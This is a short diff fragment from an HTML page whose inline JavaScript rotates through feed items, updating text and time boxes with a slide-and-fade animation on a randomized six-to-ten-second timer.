+                    currentIndex = (currentIndex + 1) % feedData.length;
+                    const currentItem = feedData[currentIndex];
+                    textBox.innerHTML = currentItem.text;
+                    timeBox.innerText = currentItem.time;
+                    containerBox.classList.remove('-translate-y-2');
+                    containerBox.classList.add('translate-y-2');
+
+                    setTimeout(() => {
+                        containerBox.classList.remove('translate-y-2', 'opacity-0');
+                        containerBox.classList.add('translate-y-0', 'opacity-100');
+                    }, 50);
+                }, 500);
+            }
+
+            function queueNextCycle() {
+                const randomizedInterval = Math.floor(Math.random() * (10000 - 6000 + 1)) + 6000;
+                setTimeout(() => {
+                    cycleFeed();
+                    queueNextCycle();
+                }, randomizedInterval);
+            }
+            queueNextCycle();
+        }
+    </script>
+</body>
+</html>
 
